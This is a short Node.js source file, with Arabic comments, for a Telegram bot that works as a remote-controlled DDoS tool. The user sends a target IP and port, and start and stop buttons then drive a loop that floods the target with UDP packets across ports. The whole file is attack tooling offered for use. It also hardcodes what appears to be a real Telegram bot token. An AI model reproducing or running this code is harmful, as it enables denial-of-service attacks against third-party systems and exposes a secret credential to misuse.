// معتمدٌ على استخدام مكتبة 'node-telegram-bot-api'
const TelegramBot = require('node-telegram-bot-api');
const dgram = require('dgram');

const token = '6352590582:AAHU-r_woFNI4d4FLCbQgvNKSfxXhcPilHw';
const bot = new TelegramBot(token, { polling: true });

const socket = dgram.createSocket('udp4');
let sent = 0;
let port = 1;
let sendPackets = false;
let targetIP;
let targetPort;

function sendPacket(ip, port) {
  const message = Buffer.from('Hello, World!');
  socket.send(message, 0, message.length, port, ip, (err) => {
    if (err) throw err;
    sent++;
    port++;
    console.log(`Sent ${sent} packet to ${ip} through port: ${port}`);
    if (port === 65534) {
      port = 1;
    }
    if (sendPackets) {
      sendPacket(ip, port);
    }
  });
}

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  if (data === "start_attack") {
    sendPacket(targetIP, targetPort);
    sendPackets = true;
    bot.sendMessage(chatId, 'تم بدء الهجوم DDoS!');
  } else if (data === "stop_attack") {
    sendPackets = false;
    bot.sendMessage(chatId, 'تم إيقاف الهجوم DDoS!');
  }
});

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'يرجى إدخال عنوان الآيبي والمنفذ المستهدف (التنسيق: الآيبي:المنفذ):', {
    reply_markup: {
      force_reply: true
    }
  });
});

bot.on('message', (msg) => {
  if (msg.text && msg.text.includes(':')) {
    const input = msg.text.split(':');
    targetIP = input[0];
    targetPort = parseInt(input[1]);

    bot.sendMessage(msg.chat.id, 'ضوابط هجوم DDoS', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'بدء الهجوم', callback_data: 'start_attack' }],
          [{ text: 'إيقاف الهجوم', callback_data: 'stop_attack' }]
        ]
      }
    });
  }
});